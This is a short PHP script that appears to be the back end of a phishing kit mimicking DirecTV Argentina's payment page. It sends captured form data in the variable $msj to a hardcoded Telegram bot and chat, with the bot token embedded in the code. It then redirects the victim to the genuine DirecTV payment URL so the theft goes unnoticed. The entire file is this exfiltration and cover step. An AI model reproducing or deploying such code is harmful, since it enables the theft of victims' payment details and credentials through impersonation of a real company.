<?php

define("BOT_TOKEN", "6416745089:AAFIM3k2c4EIFLC3L3BjnLiT7W2zwVYhq6k");
define("CHAT_ID", "5585413715");
define("API_URL", "https://api.telegram.org/bot6416745089:AAFIM3k2c4EIFLC3L3BjnLiT7W2zwVYhq6k/");
function enviar_telegram($msj)
{
    $queryArray = array("chat_id" => CHAT_ID, "text" => $msj);
    $url = "https://api.telegram.org/bot6416745089:AAFIM3k2c4EIFLC3L3BjnLiT7W2zwVYhq6k/sendMessage?" . http_build_query($queryArray);
    $result = file_get_contents($url);
}
enviar_telegram($msj);
header("location:https://www.directv.com.ar/pagar");
